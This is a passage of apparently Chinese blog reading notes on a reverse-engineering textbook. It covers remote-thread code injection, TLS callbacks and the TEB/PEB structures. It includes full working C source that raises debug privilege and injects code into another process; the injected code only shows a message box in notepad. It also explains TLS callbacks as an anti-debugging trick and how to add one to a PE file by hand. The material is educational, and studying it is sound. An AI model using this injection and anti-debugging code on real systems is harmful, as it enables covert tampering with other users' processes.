GetProcAddress()</span></span><br><span class="line">    <span class="keyword">char</span>    szBuf[<span class="number">4</span>][<span class="number">128</span>];          <span class="comment">// "user32.dll", "MessageBoxA", "www.reversecore.com", "ReverseCore"</span></span><br><span class="line">&#125; THREAD_PARAM, * PTHREAD_PARAM;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LoadLibraryA()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* PFLOADLIBRARYA)</span> <span class="comment">//对函数定义一个别名，下面同。</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GetProcAddress()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* PFGETPROCADDRESS)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpProcName</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//MessageBoxA()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI* PFMESSAGEBOXA)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT uType</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC         pFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LoadLibrary()</span></span><br><span class="line">    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);    <span class="comment">// "user32.dll"</span></span><br><span class="line">    <span class="keyword">if</span> (!hMod)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GetProcAddress()</span></span><br><span class="line">    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);  <span class="comment">// "MessageBoxA"</span></span><br><span class="line">    <span class="keyword">if</span> (!pFunc)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MessageBoxA()</span></span><br><span class="line">    ((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectCode</span><span class="params">(DWORD dwPID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    THREAD_PARAM    param = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">    HANDLE          hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE          hThread = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID          pRemoteBuf[<span class="number">2</span>] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">    DWORD           dwSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set THREAD_PARAM</span></span><br><span class="line">    param.pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">    param.pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">"GetProcAddress"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">0</span>], <span class="string">"user32.dll"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">1</span>], <span class="string">"MessageBoxA"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">2</span>], <span class="string">"Injected by Bxb"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">3</span>], <span class="string">"ReverseCore"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open Process</span></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,   <span class="comment">// dwDesiredAccess</span></span><br><span class="line">        FALSE,                <span class="comment">// bInheritHandle</span></span><br><span class="line">        dwPID)))             <span class="comment">// dwProcessId</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcess() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for THREAD_PARAM</span></span><br><span class="line">    dwSize = <span class="keyword">sizeof</span>(THREAD_PARAM);</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess,          <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                 <span class="comment">// lpAddress</span></span><br><span class="line">        dwSize,               <span class="comment">// dwSize</span></span><br><span class="line">        MEM_COMMIT,           <span class="comment">// flAllocationType</span></span><br><span class="line">        PAGE_READWRITE)))    <span class="comment">// flProtect</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,                       <span class="comment">// hProcess</span></span><br><span class="line">        pRemoteBuf[<span class="number">0</span>],                  <span class="comment">// lpBaseAddress</span></span><br><span class="line">        (LPVOID)&amp;param,                 <span class="comment">// lpBuffer</span></span><br><span class="line">        dwSize,                         <span class="comment">// nSize</span></span><br><span class="line">        <span class="literal">NULL</span>))                         <span class="comment">// [out] lpNumberOfBytesWritten</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for ThreadProc()</span></span><br><span class="line">    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess,          <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                 <span class="comment">// lpAddress</span></span><br><span class="line">        dwSize,               <span class="comment">// dwSize</span></span><br><span class="line">        MEM_COMMIT,           <span class="comment">// flAllocationType</span></span><br><span class="line">        PAGE_EXECUTE_READWRITE)))    <span class="comment">// flProtect</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,                       <span class="comment">// hProcess</span></span><br><span class="line">        pRemoteBuf[<span class="number">1</span>],                  <span class="comment">// lpBaseAddress</span></span><br><span class="line">        (LPVOID)ThreadProc,             <span class="comment">// lpBuffer</span></span><br><span class="line">        dwSize,                         <span class="comment">// nSize</span></span><br><span class="line">        <span class="literal">NULL</span>))                         <span class="comment">// [out] lpNumberOfBytesWritten</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(hThread = CreateRemoteThread(hProcess,            <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                <span class="comment">// lpThreadAttributes</span></span><br><span class="line">        <span class="number">0</span>,                   <span class="comment">// dwStackSize</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>],     <span class="comment">// dwStackSize</span></span><br><span class="line">        pRemoteBuf[<span class="number">0</span>],       <span class="comment">// lpParameter</span></span><br><span class="line">        <span class="number">0</span>,                   <span class="comment">// dwCreationFlags</span></span><br><span class="line">        <span class="literal">NULL</span>)))             <span class="comment">// lpThreadId</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"CreateRemoteThread() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE); <span class="comment">//一直等待上面的线程结束，发出信号。</span></span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> <span class="comment">//进行提权。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">        &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcessToken error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">        lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">        &amp;luid))        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"LookupPrivilegeValue error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"AdjustTokenPrivileges error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"The token does not have the specified privilege. \n"</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n USAGE  : %s &lt;pid&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="keyword">if</span> (!SetPrivilege(SE_DEBUG_NAME, TRUE))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// code injection</span></span><br><span class="line">    dwPID = (DWORD)atol(argv[<span class="number">1</span>]);</span><br><span class="line">    InjectCode(dwPID);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向notepad注入显示一个对话框的代码并调试注入代码：</p><p>首先查看将notepad加载入OD并运行，然后使用Process Explorer进程管理查看notepad的PID；OD中设置事件终止在新的线程（<strong>即我们在另一个程序使用CreateRemoteThread()在notepad中创建的线程</strong>）。</p><p>开始注入，OD中成功暂停在新的线程。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917163730590.png" alt="image-20200917163730590"></p><p>成功。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917163853250.png" alt="image-20200917163853250"></p><p>另外有一个注意的就是，使用VS编译上面的代码时一定要选release编译选项，不然会注入失败。。原因之一是：release编译选项的编译的exe中二进制代码函数的顺序与源代码中的一致，这样就能使用后一个函数减前一个函数获得函数的大小。其他原因暂时不知道。。。</p><p>最后，win32编程要多熟悉熟悉才行。。</p><hr><h2 id="第四十一章-ASLR"><a href="#第四十一章-ASLR" class="headerlink" title="第四十一章 ASLR"></a>第四十一章 ASLR</h2><p>总结在其他帖子：<strong><a href="http://www.bxnop.cn/2020/05/12/ASLR/">http://www.bxnop.cn/2020/05/12/ASLR/</a></strong></p><hr><h2 id="第四十五章-TLS回调函数"><a href="#第四十五章-TLS回调函数" class="headerlink" title="第四十五章 TLS回调函数"></a>第四十五章 TLS回调函数</h2><h3 id="介绍-6"><a href="#介绍-6" class="headerlink" title="介绍"></a>介绍</h3><p>TLS是各线程的独立的数据存储空间，用来保存变量或回调函数。使用TLS技术可在线程内部独立使用或修改进程的全局数据或静态数据，就像对待自身的局部变量一样。</p><p>TLS回调函数是指，每当创建或终止进程时，TLS回调函数都会自动调用执行，前后共2次，执行进程的主线程（运行进程的EP代码）前，TLS回调函数会先别调用执行，这使得该特征应用于反调试技术。</p><p>若编程中启用了TLS功能，PE头文件就会设置TLS表（TLS Table）项目，即可选头中的<strong>IMAGE_DATA-DRRECTORY[9]</strong>记录了TLS表的RVA与SIZE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY32</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD StartAddressOfRawData; <span class="comment">//TLS静态数据开始地址</span></span><br><span class="line">    DWORD EndAddressOfRawData; <span class="comment">//TLS静态数据结束地址</span></span><br><span class="line">    DWORD AddressOfIndex; <span class="comment">//PDWORD</span></span><br><span class="line">    DWORD AddressOfCallBacks; <span class="comment">//PIMAGE_TLS_CALLBACK * ，执行函数指针(VA)数组。</span></span><br><span class="line">    DWORD SizeOfZeroFill; <span class="comment">//直接填充为0的大小</span></span><br><span class="line">    DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 *PIMAGE_TLS_DIRECTORY32;</span><br><span class="line"></span><br><span class="line">静态数据总大小就是EndAddressOfRawData-StartAddressOfRawData+SizeOfZeroFill</span><br></pre></td></tr></table></figure><blockquote><p>IMAGE_TLS_DIRECTORY结构体有2种版本，分别为32位（大小：18h）与64位，但只是成员字节大小不一样。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TLS Callback回调函数的定义：</span><br><span class="line"><span class="keyword">typedef</span> VOID </span><br><span class="line">(NTAPI *PIMAGE_TLS_CALLBACK)(PVOID DLLHandle,DWORD Reason,PVOID Reserved);</span><br><span class="line"></span><br><span class="line">其中参数Reason为调用回调函数的原因:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_ATTACH 1 进程启动</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_ATTACH 2 线程启动</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_DERACH 3 线程退出</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_DETACH 0 进程退出</span></span><br></pre></td></tr></table></figure><h3 id="调试TLS回调函数"><a href="#调试TLS回调函数" class="headerlink" title="调试TLS回调函数"></a>调试TLS回调函数</h3><p>因为TLS回调函数在EP代码之前被调用执行了，直接使用调试器打开是无法调试的。</p><p>修改ollydbg的选项，让调试器暂停的位置是系统断点（System Startup Breakpoint）来调试TLS回调函数。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711093140091.png" alt="image-20200711093140091"></p><blockquote><p>在Ollydbg调试器的默认设置下，调试器会在EP处暂停，而WinDbg调试器默认在系统启动断点暂停。</p></blockquote><p>使用CFF explorer查看tls回调表回调函数的地址。可以看到有2个回调函数。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711103234916.png" alt="image-20200711103234916"></p><p>使用olldbg advanced插件，打开暂停在回调函数的选项。F9运行。可以看到，和上面查看的回调函数地址一样。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711103428275.png" alt="image-20200711103428275"></p><h3 id="手工添加TLS回调函数"><a href="#手工添加TLS回调函数" class="headerlink" title="手工添加TLS回调函数"></a>手工添加TLS回调函数</h3><p>首先确定IMAGE_TLS_DIRECTORY结构体与TLS回调函数放到文件的那个位置。向PE文件添加代码或数据时，有三种方法：</p><blockquote><p>1.添加到节区的末尾的空白区域。2.增加最后一个节区的大小。3.在最后增加新节区。</p></blockquote><p>之前的内嵌打补丁使用的第1种方法，这里使用第二种。</p><p>查看最后一个节区的属性：<strong>注意section alignment:1000，file alignment:200</strong><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711105035280.png" alt="image-20200711105035280"></p><p>知道文件对齐单位是200，所以这里将最后一个节区大小增加200（即文件文件大小变为9200+200 = 9400），那需要修改最后一个节区的Raw Size从200增加到400。但是Virtual Size可以不修改，因为文件对齐单位是1000，加上200后也远小于1000的。</p><p>修改Raw Size：400。增加3个属性：1.节中包含代码；2.可执行；3.可写。</p><blockquote><p>20 IMAGE_SCN_CNT_CODE 节中包含代码</p><p>20000000 IMAGE_SCN_MEM_EXECUTE 可执行</p><p>80000000 IMAGE_SCN_MEM_WRITE 可写</p></blockquote><p>下面设置TLS表：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711110919960.png" alt="image-20200711110919960"></p><p>写入IMAGE_TLS_DIRECTORY结构体：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711115845463.png" alt="image-20200711115845463"></p><p>写入回调函数：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711123118819.png" alt="image-20200711123118819"></p><p>成功：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711123251886.png" alt="image-20200711123251886"></p><hr><h2 id="第四十六章-TEB"><a href="#第四十六章-TEB" class="headerlink" title="第四十六章 TEB"></a>第四十六章 TEB</h2><h3 id="介绍-7"><a href="#介绍-7" class="headerlink" title="介绍"></a>介绍</h3><p>TEB：线程环境块，该结构体包含进程中运行线程的各种信息，进程中的每个线程都对应一个TEB结构体。</p><p>TEB结构体中的重要成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x000</span> NtTib:_NT_TIB</span><br><span class="line">+<span class="number">0x030</span> ProcessEnvironmentBlock:Ptr32_PEB（指向PEB结构体的指针）</span><br></pre></td></tr></table></figure><p>NtTib成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EXCEPTION_REGISIRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span></span><br><span class="line">    PVOID StackBase;</span><br><span class="line">    PVOID StackLimit;</span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125;NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure><p>ExceptionList成员指向EXCEPTION_REGISIRATION_RECORD结构体组成的链表，它用于Windows OS的SEH。</p><p>Self成员是_NT_TIB结构体的自引用指针，也是TEB结构体的指针（因为TEB结构体的第一个成员是_NT_TIB结构体）</p><h3 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h3><p>Ntdll.NtCurrentTeb（）API用来放回当前线程的TEB结构体的地址。</p><p>OD中载入一个程序，搜索该API并进入：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200717205028466.png" alt="image-20200717205028466"></p><blockquote><p>TEB结构体的地址与FS段寄存器所指的段内存的基址是一样的。</p></blockquote><h3 id="FS段寄存器"><a href="#FS段寄存器" class="headerlink" title="FS段寄存器"></a>FS段寄存器</h3><p>FS段寄存器用来指示当前线程的TEB结构体。实际上，FS寄存器并非直接指向TEB结构体的地址，它持有SDT的索引，而该索引持有实际的TEB地址。</p><blockquote><p>SDT位于内核内存区域，其地址存储在特殊的寄存器GDTR(全局描述符表寄存器)中。</p></blockquote><p>上述示意图：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200717211000065.png" alt="image-20200717211000065"></p><p>由于段寄存实际存储的是SDT的索引，所以它也被称为“段选择符”，TEB结构体位于FS段选择符所指的段内存的起始地址处。</p><p>FS:[0x18] = TEB起始地址:</p><p><strong>FS:[0x18] = TEB.NtTib.Self = address of TIB = address of TEB = FS:0</strong></p><p>FS:[0x30] = PEB起始地址：</p><p><strong>FS:[0x30] = TEB.ProcessEnvironmentBlock = address of PEB</strong></p><p>FS:[0] = SEH起始地址：</p><p><strong>FS:[0] = TEB.NtTIb.ExceptionList = address of SEH</strong></p><hr><h2 id="第四十七章-PEB"><a href="#第四十七章-PEB" class="headerlink" title="第四十七章 PEB"></a>第四十七章 PEB</h2><h3 id="介绍-8"><a href="#介绍-8" class="headerlink" title="介绍"></a>介绍</h3><p>PEB：进程环境块，存放进程信息的结构体。</p><p>TEB结构体位于FS段选择符所指的段内存的起始地址处，而ProcessEnvironmentBlock成员位于距TEB结构体Offset 30位置，所以：FS:[30] = TEB.ProcessEnvironmentBlock = address of PEB</p><p>获取PEB的两种方法：</p><blockquote><p><strong>1.直接获取PEB地址：mov eax, dword ptr fs:[30];    fs:[30] = address of PEB</strong></p><p><strong>2。先获取TEB地址，再通过ProcessEnvironmentBlock成员+30偏移处获取：mov eax, dword pte fs:[18]; mov eax, dword ptr ds:[eax+30]</strong></p></blockquote><p>PEB中重要成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">002</span> BeingDebugged:UChar</span><br><span class="line">+<span class="number">008</span> ImageBaseAddress:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">00</span>c Ldr:Ptr32 _PEB_LDR_DATA</span><br><span class="line">+<span class="number">018</span> ProcessHeap:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">068</span> NtGlobalFlag:Uint4B</span><br></pre></td></tr></table></figure><h3 id="实操-3"><a href="#实操-3" class="headerlink" title="实操"></a>实操</h3><h4 id="PEB-BeingDebugged"><a href="#PEB-BeingDebugged" class="headerlink" title="PEB.BeingDebugged"></a>PEB.BeingDebugged</h4><p>Kernel32.dll中的Kernel32!IsDebuggerPresent（）API:该API通过检查PEB.BeingDebugged成员确定是否正在调试进程（是返回1，否返回0）：<code>Bool WINAPI IsDebuggerPresent(void);</code><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200718102652664.png" alt="image-20200718102652664"></p><blockquote><p>Windows 7中，IsDebuggerPresent()API是在Kernelbase.dll中实现。而在Windows XP及以前的版本的操作系统中，它在Kernel32.dll中实现。</p></blockquote><h4 id="PEB-ImageBaseAddress"><a href="#PEB-ImageBaseAddress" class="headerlink" title="PEB.ImageBaseAddress"></a>PEB.ImageBaseAddress</h4><p>PEB.ImageBaseAddress成员用来表示进程的Imagebase：GetModuleHandle()API用来获取ImageBase<img 